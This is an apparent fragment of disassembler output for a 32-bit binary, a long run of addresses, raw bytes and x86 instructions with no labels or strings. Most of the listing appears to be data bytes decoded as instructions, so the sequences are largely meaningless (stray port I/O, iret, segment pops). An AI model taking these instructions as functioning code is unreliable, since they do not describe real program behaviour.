  4088a5:	01 89 00 13 0a 52    	add    %ecx,0x520a1300(%ecx)
  4088ab:	00 39                	add    %bh,(%ecx)
  4088ad:	02 ae 18 5d 0d 6c    	add    0x6c0d5d18(%esi),%ch
  4088b3:	00 2c 12             	add    %ch,(%edx,%edx,1)
  4088b6:	52                   	push   %edx
  4088b7:	00 6c 00 70          	add    %ch,0x70(%eax,%eax,1)
  4088bb:	14 72                	adc    $0x72,%al
  4088bd:	0d 9c 00 1e 18       	or     $0x181e009c,%eax
  4088c2:	b5 09                	mov    $0x9,%ch
  4088c4:	9c                   	pushf
  4088c5:	00 63 19             	add    %ah,0x19(%ebx)
  4088c8:	29 01                	sub    %eax,(%ecx)
  4088ca:	34 00                	xor    $0x0,%al
  4088cc:	4c                   	dec    %esp
  4088cd:	08 88 0c 79 00 58    	or     %cl,0x5800790c(%eax)
  4088d3:	11 38                	adc    %edi,(%eax)
  4088d5:	0a 79 00             	or     0x0(%ecx),%bh
  4088d8:	b0 17                	mov    $0x17,%al
  4088da:	52                   	push   %edx
  4088db:	00 79 00             	add    %bh,0x0(%ecx)
  4088de:	90                   	nop
  4088df:	09 9e 00 89 00 88    	or     %ebx,-0x77ff7700(%esi)
  4088e5:	14 a4                	adc    $0xa4,%al
  4088e7:	0d 89 00 35 18       	or     $0x18350089,%eax
  4088ec:	b1 0d                	mov    $0xd,%cl
  4088ee:	91                   	xchg   %eax,%ecx
  4088ef:	02 01                	add    (%ecx),%al
  4088f1:	07                   	pop    %es
  4088f2:	b7 0d                	mov    $0xd,%bh
  4088f4:	74 00                	je     0x4088f6
  4088f6:	91                   	xchg   %eax,%ecx
  4088f7:	07                   	pop    %es
  4088f8:	9f                   	lahf
  4088f9:	09 74 00 58          	or     %esi,0x58(%eax,%eax,1)
  4088fd:	11 38                	adc    %edi,(%eax)
  4088ff:	0a 74 00 b0          	or     -0x50(%eax,%eax,1),%dh
  408903:	17                   	pop    %ss
  408904:	88 0c 74             	mov    %cl,(%esp,%esi,2)
  408907:	00 90 09 9e 00 7c    	add    %dl,0x7c009e09(%eax)
  40890d:	00 91 07 9f 09 7c    	add    %dl,0x7c099f07(%ecx)
  408913:	00 58 11             	add    %bl,0x11(%eax)
  408916:	38 0a                	cmp    %cl,(%edx)
  408918:	7c 00                	jl     0x40891a
  40891a:	b0 17                	mov    $0x17,%al
  40891c:	88 0c 7c             	mov    %cl,(%esp,%edi,2)
  40891f:	00 90 09 9e 00 84    	add    %dl,-0x7bff61f7(%eax)
  408925:	00 91 07 9f 09 84    	add    %dl,-0x7bf660f9(%ecx)
  40892b:	00 58 11             	add    %bl,0x11(%eax)
  40892e:	38 0a                	cmp    %cl,(%edx)
  408930:	84 00                	test   %al,(%eax)
  408932:	b0 17                	mov    $0x17,%al
  408934:	88 0c 84             	mov    %cl,(%esp,%eax,4)
  408937:	00 90 09 9e 00 99    	add    %dl,-0x66ff61f7(%eax)
  40893d:	02 0f                	add    (%edi),%cl
  40893f:	1a 2d 0e 89 00 fd    	sbb    0xfd00890e,%ch
  408945:	19 51 03             	sbb    %edx,0x3(%ecx)
  408948:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408949:	00 88 14 52 00 a4    	add    %cl,-0x5bffadec(%eax)
  40894f:	00 74 07 88          	add    %dh,-0x78(%edi,%eax,1)
  408953:	0c ac                	or     $0xac,%al
  408955:	00 88 14 3c 09 39    	add    %cl,0x39093c14(%eax)
  40895b:	02 ca                	add    %dl,%cl
  40895d:	1a 73 0e             	sbb    0xe(%ebx),%dh
  408960:	a9 02 d5 1a 9f       	test   $0x9f1ad502,%eax
  408965:	0e                   	push   %cs
  408966:	b1 02                	mov    $0x2,%cl
  408968:	04 10                	add    $0x10,%al
  40896a:	76 01                	jbe    0x40896d
  40896c:	89 00                	mov    %eax,(%eax)
  40896e:	d0 18                	rcrb   $1,(%eax)
  408970:	48                   	dec    %eax
  408971:	01 91 00 af 19 d0    	add    %edx,-0x2fe65100(%ecx)
  408977:	0e                   	push   %cs
  408978:	b4 00                	mov    $0x0,%ah
  40897a:	88 14 dc             	mov    %dl,(%esp,%ebx,8)
  40897d:	0e                   	push   %cs
  40897e:	91                   	xchg   %eax,%ecx
  40897f:	02 c1                	add    %cl,%al
  408981:	06                   	push   %es
  408982:	e5 0e                	in     $0xe,%eax
  408984:	bc 00 11 14 8f       	mov    $0x8f141100,%esp
  408989:	09 c4                	or     %eax,%esp
  40898b:	00 a8 07 29 01 c4    	add    %ch,-0x3bfed6f9(%eax)
  408991:	00 a6 17 b5 09 89    	add    %ah,-0x76f64ae9(%esi)
  408997:	00 53 08             	add    %dl,0x8(%ebx)
  40899a:	26 0f 91 00          	setno  %es:(%eax)
  40899e:	c0 10 34             	rclb   $0x34,(%eax)
  4089a1:	0f c9                	bswap  %ecx
  4089a3:	02 cf                	add    %bh,%cl
  4089a5:	14 3e                	adc    $0x3e,%al
  4089a7:	0f b4 00             	lfs    (%eax),%eax
  4089aa:	88 14 42             	mov    %dl,(%edx,%eax,2)
  4089ad:	0f 91 02             	setno  (%edx)
  4089b0:	94                   	xchg   %eax,%esp
  4089b1:	06                   	push   %es
  4089b2:	e5 0e                	in     $0xe,%eax
  4089b4:	d1 02                	roll   $1,(%edx)
  4089b6:	88 14 66             	mov    %dl,(%esi,%eiz,2)
  4089b9:	0f d9 02             	psubusw (%edx),%mm0
  4089bc:	88 14 52             	mov    %dl,(%edx,%edx,2)
  4089bf:	00 d9                	add    %bl,%cl
  4089c1:	02 dd                	add    %ch,%bl
  4089c3:	0d 9d 0f e1 02       	or     $0x2e10f9d,%eax
  4089c8:	f6 11                	notb   (%ecx)
  4089ca:	e6 09                	out    %al,$0x9
  4089cc:	d9 02                	flds   (%edx)
  4089ce:	ec                   	in     (%dx),%al
  4089cf:	0d a2 0f a9 01       	or     $0x1a90fa2,%eax
  4089d4:	67 09 ad 0f b1       	or     %ebp,-0x4ef1(%di)
  4089d9:	00 05 17 c0 0f 11    	add    %al,0x110fc017
  4089df:	02 71 09             	add    0x9(%ecx),%dh
  4089e2:	44                   	inc    %esp
  4089e3:	02 24 00             	add    (%eax,%eax,1),%ah
  4089e6:	8e 17                	mov    (%edi),%ss
  4089e8:	b5 09                	mov    $0x9,%ch
  4089ea:	a9 00 88 14 52       	test   $0x52148800,%eax
  4089ef:	00 a9 01 b5 18 e2    	add    %ch,-0x1de74aff(%ecx)
  4089f5:	0f a9                	pop    %gs
  4089f7:	01 c9                	add    %ecx,%ecx
  4089f9:	18 e7                	sbb    %ah,%bh
  4089fb:	0f e9 02             	psubsw (%edx),%mm0
  4089fe:	88 14 3c             	mov    %dl,(%esp,%edi,1)
  408a01:	09 89 01 0a 11 ed    	or     %ecx,-0x12eef5ff(%ecx)
  408a07:	0f a1                	pop    %fs
  408a09:	01 3b                	add    %edi,(%ebx)
  408a0b:	1b 60 09             	sbb    0x9(%eax),%esp
  408a0e:	11 02                	adc    %eax,(%edx)
  408a10:	4b                   	dec    %ebx
  408a11:	15 48 02 f1 02       	adc    $0x2f10248,%eax
  408a16:	1b 1b                	sbb    (%ebx),%ebx
  408a18:	44                   	inc    %esp
  408a19:	02 f1                	add    %cl,%dh
  408a1b:	02 b2 16 f4 0f f1    	add    -0xef00bea(%edx),%dh
  408a21:	02 f7                	add    %bh,%dh
  408a23:	1a f9                	sbb    %cl,%bh
  408a25:	0f 01 03             	sgdtl  (%ebx)
  408a28:	ed                   	in     (%dx),%eax
  408a29:	08 48 02             	or     %cl,0x2(%eax)
  408a2c:	09 03                	or     %eax,(%ebx)
  408a2e:	da 1a                	ficompl (%edx)
  408a30:	00 10                	add    %dl,(%eax)
  408a32:	11 02                	adc    %eax,(%edx)
  408a34:	89 17                	mov    %edx,(%edi)
  408a36:	e6 09                	out    %al,$0x9
  408a38:	11 03                	adc    %eax,(%ebx)
  408a3a:	88 14 06             	mov    %dl,(%esi,%eax,1)
  408a3d:	10 91 02 01 07 1f    	adc    %dl,0x1f070102(%ecx)
  408a43:	10 b9 00 88 14 52    	adc    %bh,0x52148800(%ecx)
  408a49:	00 b9 00 a5 0d f9    	add    %bh,-0x6f25b00(%ecx)
  408a4f:	01 a9 00 cd 07 33    	add    %ebp,0x3307cd00(%ecx)
  408a55:	10 b9 00 3e 0a fe    	adc    %bh,-0x1f5c200(%ecx)
  408a5b:	01 a9 00 5c 09 39    	add    %ebp,0x39095c00(%ecx)
  408a61:	10 b9 00 67 09 03    	adc    %bh,0x3096700(%ecx)
  408a67:	02 a9 00 2c 12 3f    	add    0x3f122c00(%ecx),%ch
  408a6d:	10 cc                	adc    %cl,%ah
  408a6f:	00 25 0a a9 0c cc    	add    %ah,0xcc0ca90a
  408a75:	00 95 18 53 09 cc    	add    %dl,-0x33f6ace8(%ebp)
  408a7b:	00 e8                	add    %ch,%al
  408a7d:	0e                   	push   %cs
  408a7e:	b7 0c                	mov    $0xc,%bh
  408a80:	a1 01 68 1b 5f       	mov    0x5f1b6801,%eax
  408a85:	00 a9 00 88 14 48    	add    %ch,0x48148800(%ecx)
  408a8b:	01 d1                	add    %edx,%ecx
  408a8d:	00 59 07             	add    %bl,0x7(%ecx)
  408a90:	61                   	popa
  408a91:	10 d1                	adc    %dl,%cl
  408a93:	00 16                	add    %dl,(%esi)
  408a95:	09 08                	or     %ecx,(%eax)
  408a97:	02 19                	add    (%ecx),%bl
  408a99:	03 13                	add    (%ebx),%edx
  408a9b:	0a 52 00             	or     0x0(%edx),%dl
  408a9e:	d4 00                	aam    $0x0
  408aa0:	88 14 52             	mov    %dl,(%edx,%edx,2)
  408aa3:	00 11                	add    %dl,(%ecx)
  408aa5:	02 f9                	add    %cl,%bh
  408aa7:	08 44 02 21          	or     %al,0x21(%edx,%eax,1)
  408aab:	03 88 14 66 0f 21    	add    0x210f6614(%eax),%ecx
  408ab1:	03 56 17             	add    0x17(%esi),%edx
  408ab4:	86 10                	xchg   %dl,(%eax)
  408ab6:	29 03                	sub    %eax,(%ebx)
  408ab8:	70 14                	jo     0x408ace
  408aba:	8c 10                	mov    %ss,(%eax)
  408abc:	31 03                	xor    %eax,(%ebx)
  408abe:	1e                   	push   %ds
  408abf:	18 92 10 39 03 2e    	sbb    %dl,0x2e033910(%edx)
  408ac5:	0c 98                	or     $0x98,%al
  408ac7:	10 d4                	adc    %dl,%ah
  408ac9:	00 2b                	add    %ch,(%ebx)
  408acb:	16                   	push   %ss
  408acc:	ca 09 d4             	lret   $0xd409
  408acf:	00 74 07 88          	add    %dh,-0x78(%edi,%eax,1)
  408ad3:	0c 39                	or     $0x39,%al
  408ad5:	03 13                	add    (%ebx),%edx
  408ad7:	0a 52 00             	or     0x0(%edx),%dl
  408ada:	31 03                	xor    %eax,(%ebx)
  408adc:	63 19                	arpl   %ebx,(%ecx)
  408ade:	29 01                	sub    %eax,(%ecx)
  408ae0:	d4 00                	aam    $0x0
  408ae2:	48                   	dec    %eax
  408ae3:	18 26                	sbb    %ah,(%esi)
  408ae5:	0f 21 03             	mov    %db0,%ebx
  408ae8:	88 14 03             	mov    %dl,(%ebx,%eax,1)
  408aeb:	02 39                	add    (%ecx),%bh
  408aed:	03 a3 0f 98 10 29    	add    0x2910980f(%ebx),%esp
  408af3:	03 13                	add    (%ebx),%edx
  408af5:	0a 52 00             	or     0x0(%edx),%dl
  408af8:	11 02                	adc    %eax,(%edx)
  408afa:	60                   	pusha
  408afb:	18 b1 10 11 02 80    	sbb    %dh,-0x7ffdeef0(%ecx)
  408b01:	10 b5 10 11 02 07    	adc    %dh,0x7021110(%ebp)
  408b07:	1b 44 02 01          	sbb    0x1(%edx,%eax,1),%eax
  408b0b:	03 79 18             	add    0x18(%ecx),%edi
  408b0e:	48                   	dec    %eax
  408b0f:	02 59 03             	add    0x3(%ecx),%bl
  408b12:	88 14 03             	mov    %dl,(%ebx,%eax,1)
  408b15:	02 59 03             	add    0x3(%ecx),%bl
  408b18:	13 0d bb 10 a1 01    	adc    0x1a110bb,%ecx
  408b1e:	cf                   	iret
  408b1f:	16                   	push   %ss
  408b20:	bf 10 69 03 88       	mov    $0x88036910,%edi
  408b25:	14 52                	adc    $0x52,%al
  408b27:	00 c1                	add    %al,%cl
  408b29:	00 1c 06             	add    %bl,(%esi,%eax,1)
  408b2c:	ba 09 71 03 2e       	mov    $0x2e037109,%edx
  408b31:	0e                   	push   %cs
  408b32:	d0 10                	rclb   $1,(%eax)
  408b34:	71 01                	jno    0x408b37
  408b36:	f9                   	stc
  408b37:	0d 9d 0f a9 00       	or     $0xa90f9d,%eax
  408b3c:	cd 07                	int    $0x7
  408b3e:	39 10                	cmp    %edx,(%eax)
  408b40:	a1 01 19 0e d7       	mov    0xd70e1901,%eax
  408b45:	10 a1 01 fd 13 08    	adc    %ah,0x813fd01(%ecx)
  408b4b:	02 dc                	add    %ah,%bl
  408b4d:	00 25 0a a9 0c dc    	add    %ah,0xdc0ca90a
  408b53:	00 95 18 53 09 dc    	add    %dl,-0x23f6ace8(%ebp)
  408b59:	00 e8                	add    %ch,%al
  408b5b:	0e                   	push   %cs
  408b5c:	b7 0c                	mov    $0xc,%bh
  408b5e:	79 03                	jns    0x408b63
  408b60:	85 0d 31 11 11 02    	test   %ecx,0x2111131
  408b66:	52                   	push   %edx
  408b67:	18 b1 10 e4 00 88    	sbb    %dh,-0x77ff1bf0(%ecx)
  408b6d:	14 3c                	adc    $0x3c,%al
  408b6f:	09 21                	or     %esp,(%ecx)
  408b71:	00 70 11             	add    %dh,0x11(%eax)
  408b74:	50                   	push   %eax
  408b75:	11 cc                	adc    %ecx,%esp
  408b77:	00 91 07 9f 09 cc    	add    %dl,-0x33f660f9(%ecx)
  408b7d:	00 58 11             	add    %bl,0x11(%eax)
  408b80:	38 0a                	cmp    %cl,(%edx)
  408b82:	cc                   	int3
  408b83:	00 b0 17 88 0c cc    	add    %dh,-0x33f377e9(%eax)
  408b89:	00 90 09 9e 00 d1    	add    %dl,-0x2eff61f7(%eax)
  408b8f:	00 88 14 52 00 d1    	add    %cl,-0x2effadec(%eax)
  408b95:	00 af 11 9e 11 89    	add    %ch,-0x76ee61ef(%edi)
  408b9b:	03 d0                	add    %eax,%edx
  408b9d:	08 03                	or     %al,(%ebx)
  408b9f:	02 89 03 a4 16 03    	add    0x316a403(%ecx),%cl
  408ba5:	02 89 03 f7 0b 51    	add    0x510bf703(%ecx),%cl
  408bab:	03 89 03 48 19 51    	add    0x51194803(%ecx),%ecx
  408bb1:	03 89 03 e4 19 51    	add    0x5119e403(%ecx),%ecx
  408bb7:	03 d1                	add    %ecx,%edx
  408bb9:	00 95 18 29 01 d1    	add    %dl,-0x2efed6e8(%ebp)
  408bbf:	00 35 19 a4 11 99    	add    %dh,0x9911a419
  408bc5:	03 be 07 08 02 d1    	add    -0x2efdf7f9(%esi),%edi
  408bcb:	00 82 17 52 00 a1    	add    %al,-0x5effade9(%edx)
  408bd1:	01 7c 17 aa          	add    %edi,-0x56(%edi,%edx,1)
  408bd5:	11 a1 01 de 07 a2    	adc    %esp,-0x5df821ff(%ecx)
  408bdb:	0f d4 00             	paddq  (%eax),%mm0
  408bde:	8c 0d b1 11 a1 01    	mov    %cs,0x1a111b1
  408be4:	7c 17                	jl     0x408bfd
  408be6:	b7 11                	mov    $0x11,%bh
  408be8:	a1 01 e6 0f 08       	mov    0x80fe601,%eax
  408bed:	02 81 03 42 1a c1    	add    -0x3ee5bdfd(%ecx),%al
  408bf3:	11 81 03 37 1a cd    	adc    %eax,-0x32e5c8fd(%ecx)
  408bf9:	11 81 03 66 15 d5    	adc    %eax,-0x2aea99fd(%ecx)
  408bff:	11 81 03 1c 0c 98    	adc    %eax,-0x67f3e3fd(%ecx)
  408c05:	10 81 03 10 0c 03    	adc    %al,0x30c1003(%ecx)
  408c0b:	02 c1                	add    %cl,%al
  408c0d:	03 88 14 3c 09 21    	add    0x21093c14(%eax),%ecx
  408c13:	00 70 11             	add    %dh,0x11(%eax)
  408c16:	e2 11                	loop   0x408c29
  408c18:	89 03                	mov    %eax,(%ebx)
  408c1a:	88 14 52             	mov    %dl,(%edx,%edx,2)
  408c1d:	00 c9                	add    %cl,%cl
  408c1f:	03 cc                	add    %esp,%ecx
  408c21:	0d fa 11 89 03       	or     $0x38911fa,%eax
  408c26:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  408c27:	08 00                	or     %al,(%eax)
  408c29:	12 d1                	adc    %cl,%dl
  408c2b:	00 95 18 07 12 81    	add    %dl,-0x7eedf8e8(%ebp)
  408c31:	03 25 0c 17 12 ec    	add    0xec12170c,%esp
  408c37:	00 88 14 3c 09 01    	add    %cl,0x1093c14(%eax)
  408c3d:	03 dd                	add    %ebp,%ebx
  408c3f:	08 44 02 09          	or     %al,0x9(%edx,%eax,1)
  408c43:	03 78 19             	add    0x19(%eax),%edi
  408c46:	00 10                	add    %dl,(%eax)
  408c48:	a1 01 cf 16 44       	mov    0x4416cf01,%eax
  408c4d:	12 09                	adc    (%ecx),%cl
  408c4f:	03 37                	add    (%edi),%esi
  408c51:	0a c5                	or     %ch,%al
  408c53:	09 a1 01 2b 16 52    	or     %esp,0x52162b01(%ecx)
  408c59:	12 f4                	adc    %ah,%dh
  408c5b:	00 88 14 3c 09 dc    	add    %cl,-0x23f6c3ec(%eax)
  408c61:	00 91 07 9f 09 dc    	add    %dl,-0x23f660f9(%ecx)
  408c67:	00 58 11             	add    %bl,0x11(%eax)
  408c6a:	38 0a                	cmp    %cl,(%edx)
  408c6c:	dc 00                	faddl  (%eax)
  408c6e:	b0 17                	mov    $0x17,%al
  408c70:	88 0c dc             	mov    %cl,(%esp,%ebx,8)
  408c73:	00 90 09 9e 00 07    	add    %dl,0x7009e09(%eax)
  408c79:	00 04 00             	add    %al,(%eax,%eax,1)
  408c7c:	0d 00 07 00 08       	or     $0x8000700,%eax
  408c81:	00 10                	add    %dl,(%eax)
  408c83:	00 12                	add    %dl,(%edx)
  408c85:	00 f1                	add    %dh,%cl
  408c87:	00 24 01             	add    %ah,(%ecx,%eax,1)
  408c8a:	08 00                	or     %al,(%eax)
  408c8c:	09 01                	or     %eax,(%ecx)
  408c8e:	24 01                	and    $0x1,%al
  408c90:	08 00                	or     %al,(%eax)
  408c92:	4d                   	dec    %ebp
  408c93:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408c96:	08 00                	or     %al,(%eax)
  408c98:	c1 01 24             	roll   $0x24,(%ecx)
  408c9b:	01 08                	add    %ecx,(%eax)
  408c9d:	00 c5                	add    %al,%ch
  408c9f:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408ca2:	12 00                	adc    (%eax),%al
  408ca4:	c9                   	leave
  408ca5:	01 24 01             	add    %esp,(%ecx,%eax,1)
  408ca8:	0e                   	push   %cs
  408ca9:	00 d5                	add    %dl,%ch
  408cab:	01 77 02             	add    %esi,0x2(%edi)
  408cae:	0e                   	push   %cs
  408caf:	00 dd                	add    %bl,%ch
  408cb1:	01 77 02             	add    %esi,0x2(%edi)
  408cb4:	2e 00 1b             	add    %bl,%cs:(%ebx)
  408cb7:	00 dc                	add    %bl,%ah
  408cb9:	02 2e                	add    (%esi),%ch
  408cbb:	00 23                	add    %ah,(%ebx)
  408cbd:	00 e5                	add    %ah,%ch
  408cbf:	02 2e                	add    (%esi),%ch
  408cc1:	00 2b                	add    %ch,(%ebx)
  408cc3:	00 0a                	add    %cl,(%edx)
  408cc5:	03 2e                	add    (%esi),%ebp
  408cc7:	00 33                	add    %dh,(%ebx)
  408cc9:	00 13                	add    %dl,(%ebx)
  408ccb:	03 2e                	add    (%esi),%ebp
  408ccd:	00 3b                	add    %bh,(%ebx)
  408ccf:	00 1e                	add    %bl,(%esi)
  408cd1:	03 2e                	add    (%esi),%ebp
  408cd3:	00 43 00             	add    %al,0x0(%ebx)
  408cd6:	1e                   	push   %ds
  408cd7:	03 2e                	add    (%esi),%ebp
  408cd9:	00 4b 00             	add    %cl,0x0(%ebx)
  408cdc:	1e                   	push   %ds
  408cdd:	03 2e                	add    (%esi),%ebp
  408cdf:	00 53 00             	add    %dl,0x0(%ebx)
  408ce2:	24 03                	and    $0x3,%al
  408ce4:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  408ce8:	39 03                	cmp    %eax,(%ebx)
  408cea:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  408cee:	1e                   	push   %ds
  408cef:	03 2e                	add    (%esi),%ebp
  408cf1:	00 6b 00             	add    %ch,0x0(%ebx)
  408cf4:	1e                   	push   %ds
  408cf5:	03 2e                	add    (%esi),%ebp
  408cf7:	00 73 00             	add    %dh,0x0(%ebx)
  408cfa:	56                   	push   %esi
  408cfb:	03 2e                	add    (%esi),%ebp
  408cfd:	00 7b 00             	add    %bh,0x0(%ebx)
  408d00:	80 03 2e             	addb   $0x2e,(%ebx)
  408d03:	00 83 00 8d 03 83    	add    %al,-0x7cfc7300(%ebx)
  408d09:	00 93 00 13 04 e3    	add    %dl,-0x1cfbed00(%ebx)
  408d0f:	00 93 00 13 04 03    	add    %dl,0x3041300(%ebx)
  408d15:	01 93 00 13 04 23    	add    %edx,0x23041300(%ebx)
  408d1b:	01 93 00 13 04 40    	add    %edx,0x40041300(%ebx)
  408d21:	01 8b 00 de 03 43    	add    %ecx,0x4303de00(%ebx)
  408d27:	01 93 00 13 04 63    	add    %edx,0x63041300(%ebx)
  408d2d:	01 93 00 13 04 83    	add    %edx,-0x7cfbed00(%ebx)
  408d33:	01 93 00 13 04 a0    	add    %edx,-0x5ffbed00(%ebx)
  408d39:	01 9b 00 13 04 a3    	add    %ebx,-0x5cfbed00(%ebx)
  408d3f:	01 93 00 13 04 c3    	add    %edx,-0x3cfbed00(%ebx)
  408d45:	01 93 00 13 04 03    	add    %edx,0x3041300(%ebx)
  408d4b:	02 93 00 13 04 23    	add    0x23041300(%ebx),%dl
  408d51:	02 93 00 13 04 40    	add    0x40041300(%ebx),%dl
  408d57:	02 8b 00 18 04 43    	add    0x43041800(%ebx),%cl
  408d5d:	02 93 00 13 04 63    	add    0x63041300(%ebx),%dl
  408d63:	02 93 00 13 04 80    	add    -0x7ffbed00(%ebx),%dl
  408d69:	02 8b 00 49 04 83    	add    -0x7cfbb700(%ebx),%cl
  408d6f:	02 93 00 13 04 a0    	add    -0x5ffbed00(%ebx),%dl
  408d75:	02 8b 00 7b 04 c0    	add    -0x3ffb8500(%ebx),%cl
  408d7b:	02 8b 00 ab 04 e0    	add    -0x1ffb5500(%ebx),%cl
  408d81:	02 8b 00 db 04 e3    	add    -0x1cfb2500(%ebx),%cl
  408d87:	02 93 00 13 04 00    	add    0x41300(%ebx),%dl
  408d8d:	03 8b 00 07 05 03    	add    0x3050700(%ebx),%ecx
  408d93:	03 93 00 13 04 20    	add    0x20041300(%ebx),%edx
  408d99:	03 8b 00 37 05 23    	add    0x23053700(%ebx),%ecx
  408d9f:	03 93 00 13 04 40    	add    0x40041300(%ebx),%edx
  408da5:	03 8b 00 65 05 43    	add    0x43056500(%ebx),%ecx
  408dab:	03 93 00 13 04 63    	add    0x63041300(%ebx),%edx
  408db1:	03 93 00 13 04 80    	add    -0x7ffbed00(%ebx),%edx
  408db7:	03 9b 00 13 04 a3    	add    -0x5cfbed00(%ebx),%ebx
  408dbd:	03 93 00 13 04 c0    	add    -0x3ffbed00(%ebx),%edx
  408dc3:	03 9b 00 13 04 00    	add    0x41300(%ebx),%ebx
  408dc9:	04 9b                	add    $0x9b,%al
  408dcb:	00 13                	add    %dl,(%ebx)
  408dcd:	04 23                	add    $0x23,%al
  408dcf:	04 93                	add    $0x93,%al
  408dd1:	00 13                	add    %dl,(%ebx)
  408dd3:	04 40                	add    $0x40,%al
  408dd5:	04 9b                	add    $0x9b,%al
  408dd7:	00 13                	add    %dl,(%ebx)
  408dd9:	04 43                	add    $0x43,%al
  408ddb:	04 93                	add    $0x93,%al
  408ddd:	00 13                	add    %dl,(%ebx)
  408ddf:	04 63                	add    $0x63,%al
  408de1:	04 93                	add    $0x93,%al
  408de3:	00 13                	add    %dl,(%ebx)
  408de5:	04 80                	add    $0x80,%al
  408de7:	04 9b                	add    $0x9b,%al
  408de9:	00 13                	add    %dl,(%ebx)
  408deb:	04 83                	add    $0x83,%al
  408ded:	04 93                	add    $0x93,%al
  408def:	00 13                	add    %dl,(%ebx)
  408df1:	04 a3                	add    $0xa3,%al
  408df3:	04 93                	add    $0x93,%al
  408df5:	00 13                	add    %dl,(%ebx)
  408df7:	04 c0                	add    $0xc0,%al
  408df9:	04 9b                	add    $0x9b,%al
  408dfb:	00 13                	add    %dl,(%ebx)
  408dfd:	04 c3                	add    $0xc3,%al
  408dff:	04 93                	add    $0x93,%al
  408e01:	00 13                	add    %dl,(%ebx)
  408e03:	04 e3                	add    $0xe3,%al
  408e05:	04 93                	add    $0x93,%al
  408e07:	00 13                	add    %dl,(%ebx)
  408e09:	04 00                	add    $0x0,%al
  408e0b:	05 9b 00 13 04       	add    $0x413009b,%eax
  408e10:	03 05 93 00 13 04    	add    0x4130093,%eax
  408e16:	23 05 93 00 13 04    	and    0x4130093,%eax
  408e1c:	40                   	inc    %eax
  408e1d:	05 9b 00 13 04       	add    $0x413009b,%eax
  408e22:	43                   	inc    %ebx
  408e23:	05 93 00 13 04       	add    $0x4130093,%eax
  408e28:	63 05 93 00 13 04    	arpl   %eax,0x4130093
  408e2e:	c0 05 8b 00 98 05 e0 	rolb   $0xe0,0x598008b
  408e35:	05 8b 00 c4 05       	add    $0x5c4008b,%eax
  408e3a:	20 06                	and    %al,(%esi)
  408e3c:	8b 00                	mov    (%eax),%eax
  408e3e:	f9                   	stc
  408e3f:	05 40 06 8b 00       	add    $0x8b0640,%eax
  408e44:	27                   	daa
  408e45:	06                   	push   %es
  408e46:	c0 06 8b             	rolb   $0x8b,(%esi)
  408e49:	00 52 06             	add    %dl,0x6(%edx)
  408e4c:	00 07                	add    %al,(%edi)
  408e4e:	9b                   	fwait
  408e4f:	00 13                	add    %dl,(%ebx)
  408e51:	04 40                	add    $0x40,%al
  408e53:	07                   	pop    %es
  408e54:	9b                   	fwait
  408e55:	00 13                	add    %dl,(%ebx)
  408e57:	04 80                	add    $0x80,%al
  408e59:	07                   	pop    %es
  408e5a:	9b                   	fwait
  408e5b:	00 13                	add    %dl,(%ebx)
  408e5d:	04 c0                	add    $0xc0,%al
  408e5f:	07                   	pop    %es
  408e60:	9b                   	fwait
  408e61:	00 13                	add    %dl,(%ebx)
  408e63:	04 00                	add    $0x0,%al
  408e65:	08 9b 00 13 04 60    	or     %bl,0x60041300(%ebx)
  408e6b:	08 8b 00 85 06 80    	or     %cl,-0x7ff97b00(%ebx)
  408e71:	08 8b 00 c8 06 00    	or     %cl,0x6c800(%ebx)
  408e77:	09 8b 00 09 07 20    	or     %ecx,0x20070900(%ebx)
  408e7d:	09 8b 00 3c 07 e0    	or     %ecx,-0x1ff8c400(%ebx)
  408e83:	09 9b 00 13 04 20    	or     %ebx,0x20041300(%ebx)
  408e89:	0a 9b 00 13 04 c0    	or     -0x3ffbed00(%ebx),%bl
  408e8f:	0a 9b 00 13 04 00    	or     0x41300(%ebx),%bl
  408e95:	0b 9b 00 13 04 20    	or     0x20041300(%ebx),%ebx
  408e9b:	0b 8b 00 73 07 00    	or     0x77300(%ebx),%ecx
  408ea1:	0c 9b                	or     $0x9b,%al
  408ea3:	00 13                	add    %dl,(%ebx)
  408ea5:	04 c0                	add    $0xc0,%al
  408ea7:	0d 8b 00 9c 07       	or     $0x79c008b,%eax
  408eac:	a0 0e 8b 00 db       	mov    0xdb008b0e,%al
  408eb1:	07                   	pop    %es
  408eb2:	c0 0e 8b             	rorb   $0x8b,(%esi)
  408eb5:	00 12                	add    %dl,(%edx)
  408eb7:	08 e0                	or     %ah,%al
  408eb9:	0e                   	push   %cs
  408eba:	8b 00                	mov    (%eax),%eax
  408ebc:	42                   	inc    %edx
  408ebd:	08 00                	or     %al,(%eax)
  408ebf:	0f 8b 00 6e 08 20    	jnp    0x2048fcc5
  408ec5:	0f 8b 00 a5 08 40    	jnp    0x404933cb
  408ecb:	0f 8b 00 d9 08 40    	jnp    0x404967d1
  408ed1:	10 9b 00 13 04 80    	adc    %bl,-0x7ffbed00(%ebx)
  408ed7:	10 9b 00 13 04 00    	adc    %bl,0x41300(%ebx)
  408edd:	11 9b 00 13 04 40    	adc    %ebx,0x40041300(%ebx)
  408ee3:	11 9b 00 13 04 c0    	adc    %ebx,-0x3ffbed00(%ebx)
  408ee9:	11 9b 00 13 04 00    	adc    %ebx,0x41300(%ebx)
  408eef:	12 9b 00 13 04 40    	adc    0x40041300(%ebx),%bl
  408ef5:	12 9b 00 13 04 c9    	adc    -0x36fbed00(%ebx),%bl
  408efb:	00 15 02 01 00 07    	add    %dl,0x7000102
  408f01:	00 00                	add    %al,(%eax)
  408f03:	00 2c 00             	add    %ch,(%eax,%eax,1)
  408f06:	01 00                	add    %eax,(%eax)
  408f08:	20 00                	and    %al,(%eax)
  408f0a:	00 00                	add    %al,(%eax)
  408f0c:	2d 00 0c 09 28       	sub    $0x28090c00,%eax
  408f11:	09 49 09             	or     %ecx,0x9(%ecx)
  408f14:	6b 09 3e             	imul   $0x3e,(%ecx),%ecx
  408f17:	0a 81 0a 8b 0a 95    	or     -0x6af574f6(%ecx),%al
  408f1d:	0a 9f 0a a9 0a b3    	or     -0x4cf556f6(%edi),%bl
  408f23:	0a bd 0a c7 0a d1    	or     -0x2ef538f6(%ebp),%bh
  408f29:	0a 12                	or     (%edx),%dl
  408f2b:	0b 38                	or     (%eax),%edi
  408f2d:	0b 68 0b             	or     0xb(%eax),%ebp
  408f30:	a1 0b ca 0b 29       	mov    0x290bca0b,%eax
  408f35:	0c 8e                	or     $0x8e,%al
